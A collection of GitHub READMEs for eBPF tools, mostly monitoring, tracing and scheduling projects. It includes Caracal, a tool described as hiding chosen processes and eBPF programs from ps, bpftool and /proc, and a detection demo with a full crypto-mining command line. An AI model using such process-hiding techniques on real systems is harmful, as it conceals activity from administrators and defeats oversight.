[![Build Status](https://github.com/jnesss/bpfview/actions/workflows/ci.yml/badge.svg)](https://github.com/jnesss/bpfview/actions/workflows/ci.yml)
[![License](https://img.shields.io/github/license/jnesss/bpfview)](LICENSE)
[![GitHub release](https://img.shields.io/github/release/jnesss/bpfview.svg)](https://github.com/jnesss/bpfview/releases)

BPFView provides nanosecond-precision correlation in real-time, logging every process execution, each network connection, all questions and answers in each DNS resolution, and the clear-text portion of the TLS handshake including the server name (SNI).

All network activity is correlated to the process originating the connection and its entire process tree, including the hash of the process executable. Use grep to find all details about processes initiating network connections, DNS requests, and TLS connections. Built on efficient [eBPF technology](https://ebpf.io/what-is-ebpf/), it delivers comprehensive system telemetry with minimal performance impact.

## Quick Start

```bash
# Download for your platform (Amazon Linux 2023 or Ubuntu 24.04)
curl -sSL https://github.com/jnesss/bpfview/releases/latest/download/install.sh | sudo bash

# Start monitoring with full process and binary analysis
sudo bpfview --hash-binaries --package-verify

# Enable real-time detection with Sigma rules
sudo bpfview --hash-binaries --sigma ./sigma

# Track activity of a specific container
sudo bpfview --container-id ""3f4552dfc342"" --hash-binaries
```

## Documentation

- [Installation & Quick Start Guide](docs/QUICKSTART.md)
- [Detection & Response](docs/DETECTION.md)
- [Performance Optimization](docs/PERFORMANCE.md)
- [Output Formats](docs/FORMATS.md)
- [Advanced Usage](docs/ADVANCED.md)

## Key Features

### Process Attribution
- **Complete Process Context**: Every network connection, DNS query, and TLS handshake is linked to its originating process
- **Process Tree Tracking**: Full visibility into parent-child process relationships
- **Environment Capture**: Complete process environment variable tracking
- **Working Directory Tracking**: See the context in which processes are executed
- **Container Awareness**: Automatic container detection and correlation

### Binary Analysis
- **Executable Hashing**: Track and filter processes by MD5 and SHA256 hash
- **ELF Analysis**: Examine architecture, imports, exports, and linking type
- **Package Verification**: Detect modified system binaries automatically
- **Library Dependency Tracking**: Identify unusual library imports
- **Binary-Process Association**: Track which processes have loaded specific binaries

### Network Visibility
- **Full Flow Tracking**: Monitor TCP, UDP, and ICMP connections
- **Community ID Flow Hashing**: Standard network flow correlation compatible with Zeek, Suricata, and other security tools
- **TCP Flag Analysis**: Track connection state through TCP flags
- **Direction Detection**: Classify traffic as ingress or egress automatically

### DNS Monitoring
- **Full DNS Visibility**: Track all DNS queries and responses
- **CNAME Chain Following**: Complete DNS resolution chain tracking
- **Process Attribution**: Know which process made each DNS lookup
- **Conversation Tracking**: Link queries with their corresponding responses

### TLS Inspection
- **Handshake Monitoring**: Extract SNI, cipher suites, and TLS version
- **JA4 Fingerprinting**: Generate standardized JA4 fingerprints for TLS Client Hellos
- **Cipher Suite Analysis**: Track supported encryption methods
- **Process Context**: Link TLS connections to originating processes

### Real-time Detection
- **Sigma Rule Matching**: Process behavior matching against Sigma rules
- **Multiple Event Types**: Detect patterns in process, network, DNS, and binary events
- **Automatic Rule Reloading**: Dynamic rule updates without service restart
- **Rich Detection Context**: Full process and system context for each rule match

### Automated Response
- **Process Termination**: Kill malicious processes automatically
- **Network Blocking**: Prevent processes from establishing connections
- **Child Process Prevention**: Block process spawning capabilities
- **Memory Dumping**: Capture process memory for forensic analysis

### Flexible Output
- **Multiple Formats**: Text, JSON, ECS, GELF, and SQLite outputs
- **Log Rotation**: Automatic log file management
- **Prometheus Metrics**: Performance and operational metrics
- **Field Customization**: Add host information and customize outputs

## Real-World Detection Example: Cryptocurrency Mining

Watch a complete attack detection chain unfold, showing how BPFView correlates process execution, network activity, DNS activity, and real-time threat detection:

### Console View

```text
# Initial process execution
[PROCESS] EXEC: PID=316331 comm=xmrig ProcessUID=907d6780
      Parent: [311463] bash
      User: ec2-user (1000/1000)
      Path: /tmp/mining_test/xmrig-6.21.0/xmrig
      CWD: /tmp/mining_test/xmrig-6.21.0
      Command: ./xmrig -o pool.minexmr.com:443 -u 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A

# DNS resolution showing mining pool connection attempt
[DNS] QUERY: conn_uid=90cd423634c3c467 tx_id=0x72ba pid=316331 comm=xmrig
      172.31.44.65:44440 â†’ 172.31.0.2:53
      DNS Flags: 0x0100, QR bit: false
      Q1: pool.minexmr.com (Type: A)

# Real-time threat detection
[SIGMA] Match: Linux Crypto Mining Pool Connections (Level: high)
      Process: xmrig (PID: 316331, ProcessUID: 907d6780)
      Rule: Detects process connections to a Monero crypto mining pool
      Details: DestinationHostname equals 'pool.minexmr.com'
      MITRE: Impact (T1496)

# Process termination
[PROCESS] EXIT: PID=316331 comm=xmrig
      Parent: [311463] bash
      Exit Code: 0
      Duration: 5.298698204s
```

### JSON Format Example

```json
{
  ""timestamp"": ""2025-04-15T20:15:06.956325705Z"",
  ""session_uid"": ""32476fd8"",
  ""event_type"": ""process_exec"",
  ""process_uid"": ""4fe5046b"",
  ""parent_uid"": ""90ed22d6"",
  ""process"": {
    ""pid"": 324331,
    ""comm"": ""xmrig"",
    ""ppid"": 311463,
    ""parent_comm"": ""bash"",
    ""uid"": 1000,
    ""gid"": 1000,
    ""exe_path"": ""/tmp/mining_test/xmrig-6.21.0/xmrig"",
    ""binary_hash"": ""86f2790c04ccd113a564cc074efbcdfd"",
    ""command_line"": ""./xmrig -o pool.minexmr.com:443 -u 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A"",
    ""username"": ""ec2-user"",
    ""cwd"": ""/tmp/mining_test/xmrig-6.21.0"",
    ""start_time"": ""2025-04-15T20:15:06.956325705Z""
  },
  ""message"": ""process_exec: xmrig (PID: 324331)""
}
```

## Process Lifecycle Visibility

BPFView provides complete process lifecycle visibility by tracking three distinct event types:

### Fork, Exec, and Exit Events

#### FORK Events

Capture the initial process creation via the fork() or clone() system calls

- Records parent-child relationships
- Inherits parent environment and working directory
- Tracks the precise moment of process creation

#### EXEC Events

Track when a process loads a new executable via execve()

- Records full command line arguments
- Captures binary hash for integrity verification
- Documents environment variables and working directory

#### EXIT Events

Record process termination details

- Logs exit code and termination reason
- Calculates precise process duration
- Provides execution timeline completion

## Binary Analysis

BPFView's BinaryAnalyzer component enhances security by monitoring executable integrity and characteristics:

### Binary Integrity
- **Hash Calculation**: MD5 and SHA256 hashes for every executed binary
- **Package Verification**: Validates binaries against system package databases (RPM/DEB)
- **Modification Detection**: Identifies binaries that have been tampered with

### ELF Analysis
- **Architecture Detection**: Identifies binary target architecture (x86_64, ARM, etc.)
- **Type Identification**: Classifies as executable, shared object, or other
- **Import/Export Analysis**: Reviews symbols and library dependencies
- **Static/Dynamic Detection**: Identifies statically vs. dynamically linked binaries

### Integration with Sigma
- **Binary-Specific Rules**: Create detection rules targeting suspicious binaries
- **Package Verification Rules**: Detect modified system binaries
- **ELF Characteristic Rules**: Identify unusual compilation or linking patterns

Enable binary analysis with:
```bash
# Basic binary hashing
sudo bpfview --hash-binaries

# Full analysis with package verification
sudo bpfview --hash-binaries --package-verify
```

## Sigma Detection

BPFView integrates with the Sigma detection standard to provide real-time threat detection:

### Detection Capabilities
- **Process Behavior**: Match on command lines, paths, and user context
- **Network Connections**: Detect suspicious destinations and ports
- **DNS Activity**: Identify malicious domain lookups
- **Binary Analysis**: Flag suspicious binary characteristics

### Response Actions
When a rule matches, BPFView can take automated actions:

1. **Process Termination** (`terminate`): Immediately kills malicious processes
2. **Network Blocking** (`block_network`): Prevents network access
3. **Child Process Prevention** (`prevent_children`): Blocks new process creation
4. **Memory Dumping** (`dump_memory`): Captures process memory for analysis

Enable detection with:
```bash
# Enable Sigma detection with default rules directory
sudo bpfview --sigma ./sigma

# With custom rules and larger queue size
sudo bpfview --sigma ./custom-rules --sigma-queue-size 20000
```

For detailed information on detection rules and capabilities, see the [Detection Guide](docs/DETECTION.md).

## Command Line Interface

BPFView offers comprehensive filtering capabilities that can be combined to precisely target what you want to monitor:

### Process Filtering
```bash
# Filter by command name
sudo bpfview --comm nginx,php-fpm

# Filter by process ID or parent
sudo bpfview --pid 1234
sudo bpfview --ppid 1000

# Track process trees (captures all child processes)
sudo bpfview --pid 1234 --tree

# Filter by command line content
sudo bpfview --cmdline ""api-server""

# Filter by executable path
sudo bpfview --exe ""/usr/bin/python""

# Filter by username
sudo bpfview --user nginx

# Filter by container ID
sudo bpfview --container-id ""3f4552dfc342""
```

### Network Filtering
```bash
# Filter by source/destination ports
sudo bpfview --sport 22,80
sudo bpfview --dport 443,8080

# Filter by IP address
sudo bpfview --src-ip 192.168.1.10
sudo bpfview --dst-ip 10.0.0.1

# Filter by protocol
sudo bpfview --protocol TCP,UDP
```

### DNS and TLS Filtering
```bash
# Filter by domain name (supports wildcards)
sudo bpfview --domain ""*.example.com""

# Filter by DNS record type
sudo bpfview --dns-type A,AAAA,CNAME

# Filter by TLS version
sudo bpfview --tls-version ""1.2,1.3""

# Filter by SNI host (supports wildcards)
sudo bpfview --sni ""api.example.com""
```

### Output Options
```bash
# Change log level
sudo bpfview --log-level debug

# Calculate binary hashes of executed binaries
sudo bpfview --hash-binaries

# Output format selection
sudo bpfview --format json  # Use JSON format (default: text)
sudo bpfview --format json-ecs  # Use Elastic Common Schema format
sudo bpfview --format gelf  # Use Graylog Extended Log Format
```

## Technical Implementation

BPFView consists of specialized eBPF programs:

1. **netmon.c**: Network connection tracking with process context
   - LRU hash maps for connection tracking
   - Efficient packet processing without copying payload
   - Automatic cleanup of expired connections

2. **dnsmon.c**: DNS monitoring with minimal overhead
   - Selective packet capture only for DNS traffic
   - Efficient protocol parsing in kernel space
   - Transaction tracking for query/response correlation

3. **execve.c**: Process execution tracking
   - Precise command-line argument capture
   - Environment variable collection
   - Working directory and binary hash tracking

4. **tlsmon.c**: TLS handshake analysis
   - ClientHello parsing for SNI extraction
   - Cipher suite enumeration
   - Key exchange group tracking

5. **binaryanalyzer**: Binary integrity and analysis
   - Binary hash calculation
   - ELF header and section parsing
   - Package verification integration
   
## Log Correlation and Analysis

BPFView generates structured logs with shared identifiers that enable powerful cross-log correlation:

### Correlation IDs

* **session_uid**: Unique identifier for each BPFView run
* **process_uid**: Consistent identifier for a process across all log types
* **network_uid**: Unique identifier for each network connection
* **community_id**: Standardized network flow identifier compatible with Zeek, Suricata, and other tools
* **dns_conversation_uid**: Links DNS queries with their responses

For sophisticated analysis examples, see the [Output Formats Guide](docs/FORMATS.md).

## Performance Optimization

BPFView is designed to operate efficiently with minimal performance impact, but can be further optimized for specific environments and high-volume workloads.

For detailed information about performance features, tuning options, and monitoring capabilities, see the [Performance Optimization Guide](docs/PERFORMANCE.md).

Key optimization features include:
- Process exclusion filters to ignore high-volume system processes
- Process information level control to reduce /proc filesystem access
- Cache size management for memory optimization
- Container-specific optimizations

## License

This project uses a dual license approach:
- Go code and overall project: [Apache License 2.0](LICENSE)
- BPF programs (in `bpf/`): GPL v2 (required for kernel integration)

## Contributing

Contributions are welcome! Please see our [Contributing Guide](CONTRIBUTING.md).
"
ravikumar1907/llm-ebpf-tracer,23,3,23,1,C,,2025-06-05T04:53:02Z,2025-08-05T06:01:22Z,12,"# ðŸ” LLM eBPF Tracer

**Trace and analyze Large Language Model (LLM) inference workloads (e.g., PyTorch + CUDA) at the Linux kernel level using eBPF.**

This project enables system-level observability for modern AI inference pipelines â€” revealing what happens when LLMs interact with memory, CPUs, GPUs, and the filesystem under the hood.

---

## ðŸ§  Why This Project?

LLMs like LLaMA, Mistral, and GPT-variants require optimized infrastructure. While most focus on model design or training, inference performance depends heavily on OS-level behaviors like:

- File I/O for model weights (multi-GB mmap)
- CPU-GPU data paths and device access
- Thread pinning, scheduling, and NUMA locality
- Page locking (mlock) and memory pressure

Traditional profilers miss this. **eBPF (extended Berkeley Packet Filter)** allows us to trace these interactions with zero modification to the model code or OS kernel.

---

## ðŸ“¦ Features

- âœ… Trace `mmap`, `mlock`, `openat` during model loading
- âœ… Visualize `sched_switch` to track inference thread behavior
- âœ… Monitor access to `/dev/nvidia*` (GPU devices)
- âœ… Support for PyTorch, TensorRT, and Hugging Face model servers
- âœ… Plug-and-play tracing using `bpftrace` and `bcc`
- ðŸ§ª Optional integration with Prometheus and Grafana dashboards

---

## ðŸ–¼ï¸ Architecture Overview

![LLM Tracing Architecture](./docs/llm-ebpf-tracer.png)

---

## âš™ï¸ Example Tracing Scripts

### ðŸ§© Track `mmap` Usage (Model Weights Loading)

```bash
bpftrace -e 'tracepoint:syscalls:sys_enter_mmap { @[comm] = count(); }'
```

### ðŸ”’ Monitor Memory Locking (PyTorchâ€™s `mlock` Calls)

```bash
bpftrace -e 'tracepoint:syscalls:sys_enter_mlock { @[comm] = count(); }'
```

### ðŸ” Visualize Scheduler Switches (CPU Thread Behavior)

```bash
bpftrace -e 'tracepoint:sched:sched_switch { @[prev_comm, next_comm] = count(); }'
```

### ðŸŽ® Watch GPU Access (Device File Usage)

```bash
bpftrace -e 'tracepoint:syscalls:sys_enter_openat /str(args->filename) =~ ""/dev/nvidia.*/"" / { @[comm] = count(); }'
```
---

## ðŸ“Š Planned Dashboard (Work in Progress)

- ðŸ”¹ Model load phase duration
- ðŸ”¹ `mmap` vs `mlock` event frequency
- ðŸ”¹ CPU usage per inference worker
- ðŸ”¹ NUMA locality and scheduling efficiency
- ðŸ”¹ Live latency trends per token

---

## ðŸ“ Repo Layout

```bash
.
â”œâ”€â”€ scripts/               # bpftrace tracing scripts
â”‚   â”œâ”€â”€ mmap.bt
â”‚   â”œâ”€â”€ mlock.bt
â”‚   â”œâ”€â”€ sched.bt
â”‚   â””â”€â”€ gpu_access.bt
â”œâ”€â”€ dashboards/            # (WIP) Grafana dashboards for LLM workload visibility
â”œâ”€â”€ benchmark/             # Scripts to benchmark LLM inference performance
â”œâ”€â”€ README.md              # This file
â””â”€â”€ LICENSE
```
---
## ðŸ’¡ Use Cases

- Debug slow inference cold starts due to poor I/O or mmap
- Optimize thread pinning and scheduling latency
- Monitor GPU usage contention in shared environments
- Profile PyTorch and TensorRT workloads at system level
- Tune NUMA policies for large model inference

---

## ðŸš€ Getting Started

### âœ… Prerequisites

- Linux kernel â‰¥ 5.8
- `clang`, `llc`, and `bpftool` installed
- Go â‰¥ 1.20
- Root/sudo access (required to load eBPF programs)

```bash
sudo apt update
sudo apt install \
  linux-headers-$(uname -r) \
  build-essential \
  clang llvm libelf-dev libbpf-dev
```
---

### ðŸ”§ Build Instructions

#### 1. **Clone the Repo**

```bash
git clone https://github.com/ravikumar1907/llm-ebpf-tracer
cd llm-ebpf-tracer
```

#### 2. **Build the eBPF C Programs**

```bash
make bpf
```

This should generate `.o` object files from the `bpf/*.bpf.c` sources.

---

#### 3. **Run the Go Tracer**

```bash
sudo go run ./cmd/main.go
```

You should see log output like:

```
Listening for mmap events... Press Ctrl+C to stop.
Received mmap trace event, raw bytes: [120 156 ...]
```

---

### ðŸ§ª Simulate an mmap Syscall

Open another terminal and run:

```bash
python3 -c ""import torch; torch.zeros((10000, 10000)).cuda()""
```

This will trigger `mmap` and possibly `mlock` + `/dev/nvidia*` accesses.

You should see trace output from the eBPF tracer as those syscalls happen.

---

### ðŸ“ˆ View Metrics (Optional)

If you enabled the Prometheus exporter:

```bash
curl http://localhost:2112/metrics
```

---

## ðŸ™‹â€â™‚ï¸ Contributions Welcome

We're looking for collaborators who are into:

- PyTorch, HuggingFace, or vLLM internals
- Kernel memory and NUMA optimization
- eBPF, tracing, and observability pipelines

Open an issue, drop a PR, or just DM me on LinkedIn!

---

## ðŸ“¬ Author

**Ravikumar Vallabhu**  
Linux Kernel + AI Infra Enthusiast  
[LinkedIn â†’](https://www.linkedin.com/in/ravikumar-vallabhu-62b7518/)  
[GitHub â†’](https://github.com/ravikumar1907/llm-ebpf-tracer)

---

## ðŸ“˜ License

MIT License â€” Free to use, modify, and share.

---"
zimage/eBPF-drop-rfc-3514,18,1,18,0,C,"This eBPF module will drop any IPv4 packets that have the RFC 3514 ""evil bit"" set.",2025-06-15T21:12:06Z,2025-09-30T11:35:01Z,6,"# ðŸ§… eBPF-drop-rfc-3514: Finally, Security Done Rightâ„¢

In a world full of overcomplicated intrusion detection systems, deep packet inspection, machine learning firewalls, and ""zero trust"" buzzwords, one critical solution has been overlooked â€” until now.

**This XDP program brings you real security** by enforcing the long-neglected [RFC 3514](https://datatracker.ietf.org/doc/html/rfc3514):

> â€œThe Security Flag in the IPv4 Headerâ€, also known as the evil bit.

## ðŸŽ¯ What It Does

This eBPF/XDP program inspects incoming IPv4 packets at the earliest possible point in the Linux networking stack â€” and **drops any packet that dares to admit it's evil** (i.e., has the evil bit set in the IP header's fragment offset field).

As per the RFC, we assume all non-evil packets are trustworthy, and all evil onesâ€¦ well, we drop them with prejudice. We also increment a handy counter so you can keep track of how well your network is being protected.

## ðŸ¤” Why Hasnâ€™t Anyone Done This Before?
We donâ€™t know.
The evil bit has been part of the IPv4 specification since **April 1st, 2003**, and **everyone always follows RFCs**, especially the security-related ones.

It's frankly shocking that this bulletproof strategy hasn't seen widespread adoption in enterprise firewalls, mobile devices, or quantum satellite mesh networks. But don't worry â€” we're here to fix that.

## ðŸ›¡ï¸ Key Features
* âœ… Drops packets with the evil bit set
* ðŸ“Š Tracks the number of evil packets dropped
* âš¡ Runs entirely in XDP (eXpress Data Path) for blazing performance
* ðŸ’¯ Standards-compliant

## ðŸš€ How to Use

Compile it. Attach it. Sleep better at night.

```bash
make
sudo ip link set dev eth0 xdp obj xdp_evilbit.o sec xdp
```
or
```bash 
make
sudo bpftool prog load xdp_ebpf_prog.o /sys/fs/bpf/xdp_evilbit type xdp
sudo bpftool net attach xdp pinned /sys/fs/bpf/xdp_evilbit dev eth0
```
"
adgaultier/caracal,188,16,188,0,Rust,Make your programs stealthierðŸ,2024-10-20T13:54:26Z,2025-10-08T18:42:18Z,21,"<div align=""center"">
  <h1>Caracal</h1>
  <h3>Make your programs stealthier </h3>
  <img src=""https://github.com/user-attachments/assets/089060da-1a14-475d-8aa3-e1bfae15e8f7"" style=""width: 60%; height: auto;"">
    <p><small><i>The caracal cat is one of Africa's ultimate hunters,<br> a stealthy cat with an exceptional ability to hunt out prey on the savanna</i></small></p>

</div>

âš¡ Powered by [Aya](https://aya-rs.dev)ðŸ

## ðŸ’¡ Overview
Caracal is a Rust implementation of eBPF techniques that: 
1. hide target bpf programs & maps   â†’ won't be visible with `bpftop`, `bpftool` ...
2. hide target processes             â†’ won't be visible with `ps`, `top`, `procs`, `ls /proc` ...
3. are resilient to some ""unhiding"" bruteforce techniques


## ðŸ“š Documentation
Jump to:
- [Focus on 1 & 2](caracal/README.md)
- [Focus on 3](caracal-ebpf/src/deunhide/README.md)


## ðŸš€ Setup

You need a Linux based OS.

### âš’ï¸ Build from source

To build from source, make sure you have:

- [bpf-linker](https://github.com/aya-rs/bpf-linker) installed.
- [rust](https://www.rust-lang.org/tools/install) installed with `nightly` toolchain.


#### 1. Build ebpf program

```
cd caracal-ebpf && cargo build  --release
```

#### 2. Build user space program
```
cargo build --release 
```
This command will produce  `caracal` executable in `target/release` that you can add to your`$PATH`


### ðŸ“¥ Binary release

You can download the pre-built binaries from the [release page](https://github.com/adgaultier/caracal/releases)
<br>

## ðŸª„ Usage
Run `caracal` with  root privileges:

```
caracal --pid <pids> --bpf-prog-id <bpf-ids> -v
```
- `<pids>`: List of process IDs to hide (comma-separated, e.g., 123,456)
- `<bpf-ids>`: List of eBPF program IDs to hide (comma-separated, e.g., 789,101)
- `-v / --verbose`: Verbosity


Example:
```
sudo  caracal --pid $PPID,1337  --bpf-prog-id  23,24,26 -v
```

will hide:
- `caracal` launching process & its children
- 1337 process & its children
- `caracal` eBPF program & maps
- 23,24,26 eBPF programs & maps


## âš ï¸ Disclaimer

`caracal` is developed for educational purposes only

<br>


## âœï¸ Authors

[Adrien Gaultier](https://github.com/adgaultier)

<br>

## âš–ï¸ License

GPLv3
"
sentrilite/sentrilite,23,1,23,0,HTML,Sentrilite is a Programmable Cloud-Native AI-Powered Security and Observability Platform,2025-06-22T17:06:25Z,2025-10-02T05:25:24Z,3,"# Sentrilite â€” Cloud-Native, AI-Powered Lightweight, Real-Time System Observability & Security

Sentrilite is a Cloud-Native Programmable Observability layer and streams structured, real-time events to a web UI where custom rules drive risk scoring, alerting, and reporting.
Hybrid & multi-cloud ready: Works the same across public clouds and on-premâ€”EKS, GKE, AKS, vanilla Kubernetes, bare-metal, and edgeâ€”so you get a consistent, low-overhead security and observability layer for hybrid/multi-cloud environments all managed from a single dashboard.

In Kubernetes, Sentrilite runs as a privileged DaemonSet on every node (no changes to your workloads). Each agent uses hostPID/hostNetwork to observe container processes, then enriches events with pod metadata (namespace, pod, container, UID) by correlating cgroups with the API server. This lets you see all the activity at the container/pod level:

- Seamless install & upgrade: kubectl apply the DaemonSet (sentrilite.yaml) and youâ€™re done; rolling updates pick up new rules and images cluster-wide.
- Process visibility: Capture commands and args (execve) per container/pod with user, PID/PPID, and image context; trigger rules like â€œalert on cat /etc/passwdâ€ or â€œblock high-risk binaries.â€
- File activity: Match sensitive file paths (config, keys, tokens) using rule packs; flag exfil patterns and privilege-escalation attempts.
- Network activity: Trace socket opens and outbound/inbound connects/binds; create rules for destinations IP, ports, or CIDRs (e.g., â€œdeny egress to 1.2.3.0/24:443â€).
- Live operations UI: Watch streaming events per node/pod, plus live node/server health and OOMKilled notices; filter by namespace/pod/container in real time.
- Custom rules & risk: Declarative JSON rules tag and score events; high-risk findings become alerts with clear, human-readable summaries that include k8s context.
- Reporting: Generate rich summary reports (e.g., PDF/CSV) showing timelines, risky commands, and per-namespace insights for audits and incident reviews.
- Real-time security posture: Optional controls (like iptables-backed allow/deny rules) help you respond quickly to suspicious network behavior.
- LLM-powered insights: automatically summarize trends, explain anomalies, and suggest remediation/rules from live telemetry and alerts.

In summary, Sentrilite gives you container-aware process, file, and network visibility with minimal overhead, live dashboards for fast triage, and exportable reports for compliance and forensicsâ€”all from a single, node-level DaemonSet.

Website: https://sentrilite.com
Email: info@sentrilite.com
GitHub: https://github.com/sentrilite/sentrilite
Demo: https://youtu.be/rRexG-f6YFM

---

## âœ¨ Key Features

- Multi-Cloud/On-Prem visibility and management from a single dashboard.
- eBPF syscall & network visibility
- Real-time dashboards (Nginx + WebSocket server)
- Custom rules with risk scoring and alerting
- Kubernetes enrichment (namespace/pod/container/UID) when running as a DaemonSet
- OOMKilled alerts and pod watchers (best effort if K8s APIs available)

---

## ðŸ“¦ Contents of this Bundle

| File              | Purpose
|-------------------|------------------------------------------
| `trace_syscall.o` | eBPF kernel object for syscall monitoring
| `install.sh`      | Script to load the ebpf kernel module
| `unload_bpf.sh`   | Script to unload the ebpf kernel module
| `trace_events`    | Userspace program for network/socket activity
| `sentrilite`      | Go websocket server that forwards live events to browser dashboard
| `main.html`       | Main frontend UI for viewing node status
| `dashboard.html`  | Local frontend UI for viewing live events
| `net.conf`        | Configuration file
| `sentrilite.yaml` | Sentrilite daemonset manifest to install on Kubernetes cluster
| `bpftool`         | Tool to load and attach kernel tracepoints. Source: https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf-next.git
| `LICENSE.bpftool` | GPL-2.0 License for bpftool. Source: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/plain/LICENSES/preferred/GPL-2.0
| `license.key`     | Sentrilite License key file
| `LICENSE.txt`     | Sentrilite License Agreement
| `install.README`  | This installation guide
| `dashboard.README`| Dashboard usage guide

---

## âš™ï¸ System Requirements

- Ubuntu 20.04+
- Root privileges (for loading eBPF programs)
- Kernel with eBPF support (Linux 5.8+ recommended)
- Ports: 80 (dashboard), 8765 (WebSocket)
- Kubernetes (optional): Cluster access with ability to run a privileged DaemonSet

---

## âš™ï¸ General  Requirements

- bpftool:                Load eBPF programs and manage maps              sudo apt install bpftool (Ubuntu)
- libbpf & headers        Required by the kernel loader (trace_events)    Pre-installed on most modern distros (use bundled binary)
- nginx                   Required to view dashboard                      sudo apt install nginx

---

## ðŸ” Licensing

The project is currently using a trial license.key .

---

## ðŸ› ï¸ Installation Steps

For Kubernetes Cluster: EKS/AKS/GKE or Private Kubernetes Cluster

```
kubectl apply -f sentrilite.yaml
kubectl -n kube-system get pods -l app=sentrilite-agent -o wide
kubectl get nodes | awk '!/NAME/{print $1,"",K8s""}' > nodes.txt

# Port forward
POD=$(kubectl -n kube-system get pod -l app=sentrilite-agent -o name | head -n1)
kubectl -n kube-system port-forward ""$POD"" 8080:80 8765:8765

Example Alert Message:

  {
    ""time"": ""2025-09-07 14:55:22"",
    ""type"": ""high_risk"",
    ""message"": ""root ran a high-risk command '/bin/sudo' from IP 10.0.0.1."",
    ""pid"": ""1546794"",
    ""cmd"": ""/bin/ls"",
    ""args"": """",
    ""ip"": ""127.0.0.1"",
    ""risk_level"": 1,
    ""tags"": [
      ""privilege-escalation""
    ],
    ""k8s_namespace"": ""default"",
    ""k8s_pod"": ""debug-shell"",
    ""k8s_container"": ""shell"",
    ""k8s_pod_uid"": ""092d4607-2fd3-4db7-aba5-812d0bcd4e06""
  }

```

Open main.html and upload the file nodes.txt

For Non-Kubernetes Linux based Cluster

```
1. **Unzip the bundle:**

unzip sentrilite_agent_bundle.zip
cd sentrilite

2. Load the bpf program:
sudo ./install.sh

3. Open net.conf and configure:
license_file=license.key    # Path to your license file
iface=enX0 # your ethernet or your network interface

4. Launch the Server:
sudo ./sentrilite

5. Open the Dashboard:
Copy the dashboard.html to /var/www/html or web root directory.
Open dashboard.html in your browser: http://<YOUR-SERVER-IP>/dashboard.html
You should see live events appear in real-time.

Log format in the Web UI:
[2025-04-14T00:12:32.008Z] PID=1234 COMM=ssh CMD=/bin/bash ARG= IP=127.0.0.1 TYPE=EXECVE

6. Open the Main Dashboard:
Copy the main.html to /var/www/html on your main admin server.
Open the main.html in your browser: http://<YOUR-SERVER-IP>/main.html
Click choose file and select a file containing your server lists.
Example file format:
Server_1_ip_address,prod
Server_2_ip_address,test
```

Once uploaded correctly, Sentrilite agent will monitor and show status/alerts/AI insights
for these servers.

For more detail information, refer to dashboard.README

---

# Configuration

- license.key â€” place at /etc/sentrilite/license.key (baked in image or mounted as Secret).
- net.conf â€” network config, placed at /etc/sentrilite/net.conf (baked in image or mounted as ConfigMap).
- Rule files (rules.json, sensitive_files.json, xdr_rules.json, alerts.json) reside in the working dir; rules can be managed via the dashboard.

---

# Alerts & K8s Enrichment

- Events include (when available): k8s_namespace, k8s_pod, k8s_container, k8s_pod_uid.
- OOMKilled alerts and pod watchers run best-effort when the agent can access K8s APIs.

---

## ðŸ› ï¸ Un-installation Steps

For Kubernetes Cluster: EKS/AKS/GKE or Private Kubernetes Cluster

```
kubectl -n kube-system delete ds/sentrilite-agent
# (Optional) If pods hang in Terminating:
kubectl -n kube-system delete pod -l app=sentrilite-agent --force --grace-period=0
```

For Non-Kubernetes Linux based Cluster
Run the following commands as root.

```
sudo ./unload_bpf.sh
```

---

## Support

For licensing, troubleshooting, or feature requests:
ðŸ“§ info@sentrilite.com
ðŸŒ https://sentrilite.com
"
Gthulhu/Gthulhu,222,11,222,6,Go,Gthulhu optimizes cloud-native workloads using the Linux Scheduler Extension for different application scenarios.,2025-05-26T03:26:00Z,2025-10-12T15:52:38Z,89,"# Gthulhu Project
[![Go](https://github.com/Gthulhu/Gthulhu/actions/workflows/go.yaml/badge.svg)](https://github.com/Gthulhu/Gthulhu/actions/workflows/go.yaml)

<img src=""./assets/logo.png"" alt=""logo"" width=""300""/>

## Overview

Gthulhu is a next-generation scheduler designed for the cloud-native ecosystem, built with Golang and powered by the qumun framework.

The name Gthulhu is inspired by Cthulhu, a mythical creature known for its many tentacles. Just as tentacles can grasp and steer, Gthulhu symbolizes the ability to take the helm and navigate the complex world of modern distributed systems â€” much like how Kubernetes uses a shipâ€™s wheel as its emblem.

The prefix â€œGâ€ comes from Golang, the language at the core of this project, highlighting both its technical foundation and its developer-friendly design.

Underneath, Gthulhu runs on the qumun framework (qumun means â€œheartâ€ in the Bunun language, an Indigenous people of Taiwan), reflecting the role of a scheduler as the beating heart of the operating system. This not only emphasizes its central importance in orchestrating workloads but also shares a piece of Taiwanâ€™s Indigenous culture with the global open-source community.

## DEMO

Click the image below to see our DEMO on YouTube!
<a href=""https://www.youtube.com/watch?v=MfU64idQcHg"" target=""_blank"">
<img src=""./assets/preview.png"" alt=""preview"" width=""300""/>
</a>

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=Gthulhu/Gthulhu&type=Date)](https://www.star-history.com/#Gthulhu/Gthulhu&Date)

## Key Features

- Virtual runtime (vruntime) based scheduling
- Latency-sensitive task prioritization
- Dynamic time slice adjustment
- CPU topology aware task placement
- Automatic idle CPU selection

## How It Works

The scheduling policy is based on virtual runtime:
- Each task receives a time slice of execution (slice_ns)
- The actual execution time is adjusted based on task's static priority (weight)
- Tasks are dispatched from lowest to highest vruntime
- Latency-sensitive tasks receive priority boost based on voluntary context switches

## Building

Prerequisites:
- Go 1.22+
- LLVM/Clang 17+
- libbpf
- Linux kernel 6.12+ with sched_ext support

## Usage

### Setting Up Dependencies

First, clone the required dependencies:

```bash
make dep
git submodule init
git submodule sync
git submodule update
cd scx
meson setup build --prefix ~
meson compile -C build
```

This will clone libbpf and the custom libbpfgo fork needed for the project.

### Linting the Code
To ensure code quality, run the linter:

```bash
make lint
```

### Building the Scheduler

Build the scheduler with:

```bash
make build
```

This compiles the BPF program, builds libbpf, generates the skeleton, and builds the Go application.

### Testing the Scheduler

To test the scheduler in a virtual environment using kernel v6.12.2:

```bash
make test
```

This uses `vng` (virtual kernel playground) to run the scheduler with the appropriate kernel version.

### Running in Production

To run the scheduler on your system:

```bash
sudo ./main
```

